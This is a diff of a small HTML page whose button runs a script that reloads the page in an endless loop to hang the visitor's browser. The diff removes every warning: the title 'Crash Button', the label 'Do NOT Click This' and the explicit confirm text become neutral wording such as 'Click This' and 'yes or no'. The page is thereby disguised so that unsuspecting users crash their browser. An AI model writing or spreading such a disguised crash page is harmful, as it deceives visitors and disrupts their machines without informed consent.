@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Crash Button</title>
+  <title>Button</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -26,11 +26,11 @@
 <body>
 
   <h2>Click the Button</h2>
-  <button onclick="crash()">Do NOT Click This</button>
+  <button onclick="crash()">Click This</button>
 
   <script>
     function crash() {
-      if(confirm("Do you REALLY want to crash your browser?")) {
+      if(confirm("yes or no")) {
         setTimeout(function() {
           while (1) location.reload(1);
         }, 1000);
